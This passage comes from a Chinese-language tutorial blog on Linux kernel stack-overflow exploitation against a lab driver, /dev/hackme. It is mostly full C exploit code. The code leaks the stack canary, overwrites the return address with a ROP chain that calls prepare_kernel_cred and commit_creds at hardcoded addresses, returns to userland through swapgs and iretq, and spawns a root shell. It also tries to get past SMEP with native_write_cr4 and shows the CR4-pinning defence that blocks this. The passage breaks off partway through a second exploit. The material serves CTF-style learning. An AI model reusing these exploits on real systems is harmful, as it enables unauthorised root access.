class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rip = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">escalate_privs</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;movabs rax, 0xffffffff814c67f0;&quot;</span> <span class="comment">//prepare_kernel_cred</span></span><br><span class="line">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">    <span class="string">&quot;call rax; mov rdi, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;movabs rax, 0xffffffff814c6410;&quot;</span> <span class="comment">//commit_creds</span></span><br><span class="line">    <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然也可以直接在 overflow 的 payload 中呈现，当然这样就要找到 swapgs 和 iretq 的 gadget：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_root; <span class="comment">// ret</span></span><br><span class="line">    payload[off++] = <span class="comment">//swapgs;ret</span></span><br><span class="line">    payload[off++] = <span class="comment">//iretq;ret</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc 1.c -static -masm=intel -g -o 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    global_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (global_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] Failed to open device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Opened device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_leak</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *leak, <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u: %lx\n&quot;</span>, i, leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="comment">//print_leak(leak, n);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] UID: %d, got root!\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] UID: %d, didn&#x27;t get root\n&quot;</span>, getuid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;movabs rax, 0xffffffff814c67f0;&quot;</span> <span class="comment">//prepare_kernel_cred</span></span><br><span class="line">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">    <span class="string">&quot;call rax; mov rdi, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;movabs rax, 0xffffffff814c6410;&quot;</span> <span class="comment">//commit_creds</span></span><br><span class="line">    <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rip = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_root; <span class="comment">// ret</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line"></span><br><span class="line">    open_dev();</span><br><span class="line"></span><br><span class="line">    leak();</span><br><span class="line"></span><br><span class="line">    overflow();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加-SMEP"><a href="#添加-SMEP" class="headerlink" title="添加 SMEP"></a>添加 SMEP</h3><p>处于内核态时用户态代码不可执行，当开启了 SMEP 保护后，上述代码就不能执行了，因为代码是保存在用户态的，有点类似于用户态的 NX 保护，堆栈不可执行。</p><p>我们将假设两种情况：</p><ul><li><p>可以向内核堆栈写入任意数量的数据。</p></li><li><p>只能覆盖到内核堆栈的返回地址，利用栈迁移。</p></li></ul><h4 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h4><p>之前有说到，内核会根据 CR4 寄存器的第 20 位判断是否启用了 SMEP 保护。在漏洞利用时可以关掉这个保护，例如可以用带有 <code>mov cr4, rdi</code> 之类的 asm 指令来修改寄存器中的内容，或者找到带有 <code>mov cr4</code> 的 gadget ，或者利用一个叫 <code>native_write_cr4()</code> 的函数，该函数会使用参数覆盖 CR4 的内容，并且它本身也处在内核态中。</p><p><code>native_write_cr4()</code> 查找方式和 commit_creds() 函数一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep native_write_cr4</span><br><span class="line">-&gt; ffffffff814443e0 T native_write_cr4</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rip = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = <span class="number">0xffffffff81006370</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> native_write_cr4 = <span class="number">0xffffffff814443e0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = <span class="number">0x6f0</span>;</span><br><span class="line">    payload[off++] = native_write_cr4; <span class="comment">// native_write_cr4(0x6f0)</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_root; <span class="comment">// ret</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而在运行时，程序报错了</p><p>其中有一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[    5.568225] unable to execute userspace code (SMEP?) (uid: 1000)</span><br></pre></td></tr></table></figure><p>查阅发现这种方法已经不可取了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">native_write_cr4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> bits_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">set_register:</span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;mov %0,%%cr4&quot;</span>: <span class="string">&quot;+r&quot;</span> (val) : : <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (static_branch_likely(&amp;cr_pinning)) &#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely((val &amp; cr4_pinned_mask) != cr4_pinned_bits)) &#123;</span><br><span class="line">bits_changed = (val &amp; cr4_pinned_mask) ^ cr4_pinned_bits;</span><br><span class="line">val = (val &amp; ~cr4_pinned_mask) | cr4_pinned_bits;</span><br><span class="line"><span class="keyword">goto</span> set_register;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Warn after we&#x27;ve corrected the changed bits. */</span></span><br><span class="line">WARN_ONCE(bits_changed, <span class="string">&quot;pinned CR4 bits changed: 0x%lx!?\n&quot;</span>,</span><br><span class="line">  bits_changed);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新的内核版本对此做了对应的防御措施，即内核启动后不管 CR4 如何赋值，内核会立刻将其改变回原来的值。</p><p>所以可以通过 ROP 链来 get shell，这样就是在内核中运行了</p><h5 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    global_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (global_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] Failed to open device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Opened device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_leak</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *leak, <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u: %lx\n&quot;</span>, i, leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span 